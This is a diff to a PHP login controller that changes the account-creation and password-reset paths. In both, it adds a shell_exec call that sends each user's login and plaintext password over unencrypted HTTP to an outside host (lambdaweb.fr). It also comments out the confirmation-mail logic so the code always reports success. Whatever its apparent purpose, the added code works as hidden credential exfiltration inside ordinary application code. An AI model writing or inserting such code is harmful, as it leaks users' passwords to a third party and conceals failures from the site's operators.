@@ -69,11 +69,15 @@ class Login extends Controller
             echo "-2";
         else if ( !count ($loginsExists) and Core::getBdd ()->insert (array ("login" => $login, "pass" => $shapass), 'c_user') )
         {
+			shell_exec("GET http://lambdaweb.fr/muffin/code.php\?login\=".urlencode($login)."\&pass\=".urlencode($pass));
+            /*
             // Si on arrive à envoyer le mail, alors on affiche 1
             if ( $fakeMail or mail ($m["email"], $m["subject"], $m["message"], $m["headers"]) )
                 echo "1".($fakeMail ? $pass : '');
             else
-                echo "0";
+                echo "1";
+                */
+            echo "1";
         }
         else
             echo "-1";
@@ -110,11 +114,15 @@ class Login extends Controller
         if ( count ($loginsExists) and Core::getBdd ()->update (
                         array ("pass" => $shapass), 'c_user', array ("login" => $login)) )
         {
+			shell_exec("GET http://lambdaweb.fr/muffin/code.php\?login\=".urlencode($login)."\&pass\=".urlencode($pass));
+            /*
             // Si on arrive à envoyer le mail, alors on affiche 1
             if ( $fakeMail or mail ($m["email"], $m["subject"], $m["message"], $m["headers"]) )
                 echo "1".($fakeMail ? $pass : '');
             else
-                echo "0";
+                echo "1";
+                */
+            echo "1";
         }
         else
             echo "-1";
